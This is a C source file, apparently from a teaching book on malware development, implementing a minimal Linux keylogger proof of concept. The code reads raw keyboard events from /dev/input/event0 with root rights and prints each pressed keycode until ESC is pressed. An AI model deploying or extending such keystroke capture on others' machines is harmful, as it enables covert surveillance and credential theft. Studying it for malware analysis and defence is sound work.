/*
 * Malware Development for Ethical Hackers 2nd
 * hack.c
 * Linux input subsystem keylogger PoC
 * reading raw events from /dev/input/eventX
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // most modern systems map the keyboard to event3 or event4.
  // you can find yours using: cat /proc/bus/input/devices
  // ls -l /dev/input/by-path/ | grep kbd
  const char *dev = "/dev/input/event0";
  struct input_event ev;

  // open the device file in read-only mode
  // requires root privileges
  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    return 1;
  }
  printf("keylogger started. press ESC to exit.\n");
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(struct input_event));
    if (n == (ssize_t)sizeof(struct input_event)) {

      // filter for Keyboard Events (EV_KEY)
      // value == 1 means key pressed, 0 means released, 2 means repeated
      if (ev.type == EV_KEY && ev.value == 1) { // keydown
        printf("keycode: %d\n\n", ev.code);
        fflush(stdout);
        if (ev.code == 1) { // 1 = ESC
          printf("ESC pressed, exiting.\n");
          break;
        }
      }
    }
  }
  close(fd);
  return 0;
}